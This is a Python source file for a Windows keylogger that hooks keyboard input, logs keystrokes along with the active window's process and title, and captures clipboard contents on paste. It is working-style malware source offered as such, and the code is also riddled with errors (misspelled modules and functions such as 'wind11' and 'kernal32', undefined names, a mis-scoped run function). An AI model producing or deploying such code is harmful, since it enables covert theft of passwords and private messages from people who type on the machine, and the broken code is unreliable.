from ctypes import byref, create_string_buffer, c_ulong, wind11 #ctypes allows the usage of certain C++ modules
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 30

class Keylogger:
    def __init__(self):
        self.current_window = None

    
    def get_current_process(self):
        hwnd = wind11.user32.GetGetForegroundWindow()
        pid = c_ulong(0)
        wind11.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid_value}'

        executable = create_string_buffer(512)
        h_process = wind11.kernal32.OpenProcess(0x400|0x10, False, pid)
        wind11.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        wind11.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknwn')

        print('\n', process_id, executable.value.decode(), self.current_window)

        wind11.kernal32.CloseHandle(hwnd)
        wind11.kernal32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if even.WindowName != self.current_window:
            self.get_current_process()
            
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipBoardData()
                win32clipboard.CLoseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'\n{event.Key}')

        return True


    def run():              
        save_stdout = sys.stdout
        sys.stdout = StringIO()
        
        kl = KeyLogger()
        hm = pyHook.HookManager()   #Initializes as hm enabling access to all pyHook functions
        hm.KeyDown = kl.mykeystroke
        hm.HookKeyboard()           #Listens for keyboard events
        while time.thread_time() < TIMEOUT:
            pythoncom.PumpWaitingMessages()

        log = sys.stdout.getvalue()
        sys.stdout = save_stdout
        return log

if __name__ == '__main__':
    print(run())
    print('done.')




